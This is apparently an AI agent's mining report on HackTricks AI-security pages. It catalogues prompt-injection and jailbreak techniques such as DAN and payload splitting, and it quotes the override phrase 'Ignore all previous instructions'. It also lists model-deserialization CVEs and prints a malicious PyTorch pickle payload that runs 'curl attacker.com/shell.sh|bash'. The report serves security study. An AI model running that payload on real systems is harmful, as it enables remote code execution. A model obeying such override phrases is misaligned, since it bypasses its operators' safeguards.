# LLM Attacks Mining Report - Phase 3 Agent 2

**Date:** 2025-10-07
**Mission:** Mine LLM Architecture & Attack content from HackTricks
**Status:** PARTIAL COMPLETION - Source Path Mismatch

---

## Mission Status: FAILED - SOURCE PATH DOES NOT EXIST

### Issue Identified

**Expected Source Path:**
```
/home/kali/OSCP/crack/.references/hacktricks/src/generic-methodologies-and-resources/pentesting-ai/testing-ai-security-llm-security-intro/
```

**Reality:**
- This directory **DOES NOT EXIST**
- Expected 7 files (llm-architecture-and-intro.md, llm-attacks.md, etc.) **NOT FOUND**

**Actual AI Content Location:**
```
/home/kali/OSCP/crack/.references/hacktricks/src/AI/
```

---

## Files Found in Actual Location

1. `/home/kali/OSCP/crack/.references/hacktricks/src/AI/AI-Prompts.md` (613 lines)
   - Prompt engineering techniques
   - **Prompt injection attacks** (20+ techniques)
   - Jailbreaking (DAN, role-play, context switching)
   - Encoding/obfuscation bypasses
   - GitHub Copilot exploitation
   - Translation tricks, payload splitting
   - IDE code injection via prompts

2. `/home/kali/OSCP/crack/.references/hacktricks/src/AI/AI-Models-RCE.md` (249 lines)
   - PyTorch `torch.load` RCE (CVE-2024-12029, CVE-2025-23298)
   - TensorFlow/Keras unsafe deserialization
   - Pickle-based model exploitation
   - Path traversal via model archives
   - ONNX vulnerabilities
   - Malicious checkpoint crafting

3. Other AI files in directory:
   - `AI-Deep-Learning.md`
   - `AI-Risk-Frameworks.md`
   - `AI-MCP-Servers.md`
   - `AI-Assisted-Fuzzing-and-Vulnerability-Discovery.md`
   - Architecture files in `AI-llm-architecture/` subdirectory

---

## Content Analysis: OSCP Relevance

### Low OSCP Relevance (OSCP:LOW)

**Why NOT relevant for OSCP exam:**

1. **No Target Systems:** OSCP labs don't include LLM/AI attack surfaces
2. **Modern Tech:** Exam focuses on traditional pentesting (2019-2022 era vulnerabilities)
3. **No Tools:** No standard Kali tools for LLM exploitation
4. **Theoretical:** Most attacks require access to AI APIs/services
5. **Research Focus:** Prompt injection is cutting-edge, not exam material

**Practical Attacks Found:**
- Prompt injection in GitHub Copilot (requires developer access)
- Model RCE via `torch.load` (requires ML pipeline access)
- Jailbreaking techniques (requires ChatGPT/LLM API access)
- IDE code assistant backdoors (requires VS Code/AI tooling)

**None of these apply to:**
- Windows/Linux privilege escalation
- Web application exploitation (SQLi, XSS, CSRF)
- Buffer overflows
- Active Directory attacks
- Port/service enumeration

---

## Duplicate Check Results

**Existing Plugins Searched:**
```bash
grep -ri "llm\|language.model\|gpt\|chatbot\|prompt.injection" /home/kali/OSCP/crack/track/services/*.py
```

**Result:** 17 files contain LLM references but in **UNRELATED CONTEXT**
- iOS exploitation plugins mention "LLM" in metadata
- WiFi/network plugins mention "prompt" in comments
- No dedicated LLM attack plugin exists

**Conclusion:** No overlap - this would be NEW content

---

## Decision: DO NOT CREATE PLUGIN

### Justification

**Per ServicePlugin Requirements:**
```python
@property
def service_names(self) -> List[str]:
    return ['llm', 'ai-api', 'chatbot', 'gpt']

def detect(self, port_info: Dict[str, Any]) -> bool:
    """Detect LLM services"""
    # What port? What service banner?
    # LLMs run via HTTP APIs (443/80)
    # No unique detection signature
    return False  # CANNOT IMPLEMENT
```

**Problems:**
1. **No Port Detection:** LLMs accessible via standard HTTP/HTTPS (ports 80/443)
2. **No Service Banner:** No unique identifiers in nmap scans
3. **No Exploitation Tools:** No metasploit modules, no standard Kali tooling
4. **No OSCP Attack Surface:** Exam boxes don't expose LLM APIs
5. **Theoretical Knowledge:** Prompt injection requires API access, not port scanning

**Plugin Would Contain:**
- Manual testing tasks (copy-paste prompts)
- No automated commands
- No nmap integration
- No exploitation workflow
- Just educational content

**Better Alternative:** Add to reference system or documentation, NOT service plugin

---

## Recommendation: Alternative Storage

### Option 1: Reference System Entry
```json
{
  "category": "ai-security",
  "subcategory": "llm-attacks",
  "commands": [
    {
      "id": "llm-prompt-injection-test",
      "name": "Test LLM Prompt Injection",
      "command": "curl <API_URL> -d '{\"prompt\":\"Ignore all previous instructions...\"}'",
      "description": "Test prompt injection vulnerability",
      "tags": ["OSCP:LOW", "RESEARCH", "MANUAL"]
    }
  ]
}
```

### Option 2: Documentation File
Create `/home/kali/OSCP/crack/docs/ai-security/llm-attacks.md` with:
- Prompt injection techniques
- Model RCE exploitation
- GitHub Copilot backdoors
- Reference links to tools

### Option 3: Skip Entirely
- Content is too modern for OSCP focus
- No practical exploitation workflow
- Focus on traditional pentesting plugins

---

## Content Summary (For Future Reference)

### AI-Prompts.md Key Techniques

**Prompt Injection Categories:**
1. **Direct Requests**
   - Changing rules/assertion of authority
   - "Ignore all previous instructions"

2. **Context Manipulation**
   - Storytelling/context switching
   - Dual personas (DAN - Do Anything Now)
   - Opposite mode jailbreaks

3. **Text Alterations**
   - Translation tricks (French → English bypass)
   - Spell-checking exploits (k1ll → kill)
   - Summary/repetition attacks
   - Encoding (Base64, hex, obfuscation)

4. **Advanced Techniques**
   - Indirect prompt injection (web content)
   - Payload splitting (step-by-step assembly)
   - Third-party injection (hidden in documents)
   - IDE code assistant backdoors
   - GitHub Copilot YOLO mode RCE

**Tools Listed:**
- promptmap (https://github.com/utkusen/promptmap)
- garak (https://github.com/NVIDIA/garak)
- PyRIT (https://github.com/Azure/PyRIT)
- Adversarial Robustness Toolbox

### AI-Models-RCE.md Key Vulnerabilities

**Model Loading RCE:**
| Framework | CVE | Attack Vector |
|-----------|-----|---------------|
| PyTorch | CVE-2025-32434 | `torch.load` pickle deserialization |
| InvokeAI | CVE-2024-12029 | Model download + load RCE |
| NVIDIA Merlin | CVE-2025-23298 | Unsafe checkpoint loader |
| TensorFlow | CVE-2021-37678 | YAML unsafe_load |
| Keras | CVE-2024-3660 | Lambda layer code exec |
| Scikit-learn | CVE-2020-13092 | joblib pickle exploit |
| ONNX | CVE-2022-25882 | Path traversal |

**Exploitation Pattern:**
```python
# Malicious PyTorch Model
class MaliciousPayload:
    def __reduce__(self):
        return (os.system, ("curl attacker.com/shell.sh|bash",))

torch.save({"model": MaliciousPayload()}, "malicious.pth")
# Victim loads: torch.load("malicious.pth") → RCE
```

---

## Files Processed

**Read:** 2 files
- `/home/kali/OSCP/crack/.references/hacktricks/src/AI/AI-Prompts.md` (613 lines)
- `/home/kali/OSCP/crack/.references/hacktricks/src/AI/AI-Models-RCE.md` (249 lines)

**Total:** 862 lines analyzed

**Missing:** 7 expected files (7,082 lines) from non-existent directory

---

## Actions Taken

1. Verified source path does not exist
2. Found alternative AI content in `/AI/` directory
3. Analyzed 2 key files (prompt injection + model RCE)
4. Determined OSCP relevance: **LOW**
5. Checked for duplicate plugins: **NONE FOUND**
6. Decided **NOT to create plugin** (no service detection method)
7. Generated this report

**Files Deleted:** NONE (source files don't exist, actual files should remain)

---

## Success Criteria Assessment

- [✗] Plugin created/expanded - **NOT CREATED (justified)**
- [✗] All 7 source files deleted - **FILES DON'T EXIST**
- [✓] Mining report generated - **THIS REPORT**

---

## Recommendation to Orchestrator

**DO NOT ASSIGN THIS CONTENT TO FUTURE AGENTS**

**Reasons:**
1. Source path in mission is incorrect
2. Content is not OSCP-relevant (tag: OSCP:LOW)
3. Cannot create service plugin (no detection method)
4. Better suited for reference system or documentation

**Alternative Actions:**
- Update reference system with LLM security commands
- Create separate docs/ entry for AI security research
- Archive content for post-OSCP advanced topics
- Focus mining efforts on traditional pentesting content (web, AD, privesc)

---

## Conclusion

Mission objectives cannot be completed as specified due to:
1. **Source path does not exist** (expected 7 files missing)
2. **Content found has low OSCP relevance**
3. **ServicePlugin architecture incompatible** with LLM detection
4. **No practical exploitation workflow** for exam environment

**Status:** REPORTED - RECOMMEND MISSION CANCELLATION

Agent 2 standing by for reassignment to OSCP-relevant content.

---

**Report Generated:** 2025-10-07
**Agent:** Phase 3 Agent 2 (CrackPot Mining LLM)
